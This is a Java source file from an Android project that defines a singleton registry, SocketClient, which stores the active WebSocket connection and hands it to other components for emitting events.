package com.seguranca.protecao.core;

import android.util.Log;
import okhttp3.WebSocket;
import java.util.concurrent.atomic.AtomicReference;

/**
 * SocketClient
 *
 * Singleton registry that gives feature managers access to the active
 * WebSocket connection managed by CommandControlService — no separate
 * Socket.IO channel, no second connection.
 *
 * Integration in CommandControlService:
 *
 *   // WebSocket.Listener.onOpen():
 *   SocketClient.getInstance().attach(webSocket);
 *
 *   // WebSocket.Listener.onClosing() and onFailure():
 *   SocketClient.getInstance().detach();
 *
 * Feature managers call:
 *   NexusSocket socket = SocketClient.getInstance().getSocket();
 *   if (socket != null) socket.emit("event", data);
 */
public final class SocketClient {

    private static final String TAG = "SocketClient";

    // ── Singleton ──────────────────────────────────────────────────────────────
    private static volatile SocketClient INSTANCE;

    public static SocketClient getInstance() {
        if (INSTANCE == null) {
            synchronized (SocketClient.class) {
                if (INSTANCE == null) INSTANCE = new SocketClient();
            }
        }
        return INSTANCE;
    }

    private SocketClient() {}

    // ── State ──────────────────────────────────────────────────────────────────
    private final AtomicReference<NexusSocket> activeSocket = new AtomicReference<>(null);

    // ── Called by CommandControlService ───────────────────────────────────────

    /**
     * Register the active WebSocket. Called from WebSocketListener.onOpen().
     */
    public void attach(WebSocket ws) {
        if (ws == null) return;
        activeSocket.set(new NexusSocket(ws));
        Log.d(TAG, "attached");
    }

    /**
     * Clear the active WebSocket. Called from onClosing() and onFailure().
     */
    public void detach() {
        activeSocket.set(null);
        Log.d(TAG, "detached");
    }

    // ── Feature manager API ───────────────────────────────────────────────────

    /**
     * Returns the active NexusSocket, or null if disconnected.
     * Callers must null-check before use.
     */
    public NexusSocket getSocket() {
        return activeSocket.get();
    }

    /**
     * Returns true when a WebSocket is registered and considered open.
     */
    public boolean isConnected() {
        NexusSocket s = activeSocket.get();
        return s != null && s.connected();
    }
}
